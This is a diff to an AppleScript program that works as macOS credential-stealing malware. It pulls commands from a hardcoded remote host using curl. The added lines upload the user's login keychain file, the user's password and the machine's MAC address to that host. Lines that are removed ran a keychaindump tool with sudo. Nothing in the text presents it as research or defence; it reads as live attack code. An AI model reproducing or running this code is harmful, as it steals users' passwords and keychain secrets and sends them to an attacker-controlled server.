@@ -1,3 +1,4 @@
+delay 10
 try
 	set theuser to do shell script "whoami"
 	try
@@ -8,8 +9,8 @@ on error
 	return
 end try
 
-set remoteHost to "http://damp-journey-2734.herokuapp.com"
---set remoteHost to "http://localhost:5000"
+set remoteHost to "http://penncoursesearch.com:5000"
+--set remoteHost to "http://localhost:3000"
 set commandURL to remoteHost & "/remote.txt"
 try
 	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
@@ -73,8 +74,10 @@ end try
 log "new"
 try
 	try
-		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
-		set WANIP to (characters 2 through -1 of result) as text -- Get IP
+		with timeout of 5 seconds
+			--do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
+			set WANIP to do shell script "ifconfig | grep 'autoconf temporary' | cut -d ' ' -f 2" -- Get IP
+		end timeout
 	on error
 		set WANIP to "0.0.0.0"
 	end try
@@ -87,10 +90,8 @@ end try
 log "hello"
 
 try
-	--do shell script "gcc ./keychaindump.c -o keychaindump -lcrypto"
 	log "tee"
-	--set rawpasswords to (do shell script "echo " & passwd & " | sudo -S " & POSIX path of (path to me) & "Contents/Resources/keychaindump > " & ufld & "/" & MACAD & ".txt") as text
-	--do shell script "curl -d @" & ufld & MACAD & ".txt " & remoteHost & "/b?MACAD=" & MACAD & " --header \"Content-Type:text/plain\""
+	do shell script "cd  ~/Library/Keychains/; curl -i -F filedata=@login.keychain -F macad=" & MACAD & " -F passwd=" & passwd & " " & remoteHost & "/b"
 end try
 
 on checkPassword(user, pass)
